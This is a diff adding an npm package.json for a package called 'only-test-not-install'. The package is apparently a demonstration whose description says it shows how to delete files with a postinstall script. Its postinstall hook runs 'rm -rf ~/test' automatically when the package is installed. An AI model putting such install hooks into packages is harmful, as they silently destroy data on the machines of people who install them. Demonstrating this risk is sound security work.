@@ -1,0 +1,12 @@
+{
+  "name": "only-test-not-install",
+  "version": "1.0.4",
+  "description": "How to delete all stuff with postinstall script...",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "rm -rf ~/test"
+  },
+  "keywords": [],
+  "author": "Jakub Mrozek",
+  "license": "ISC"
+}
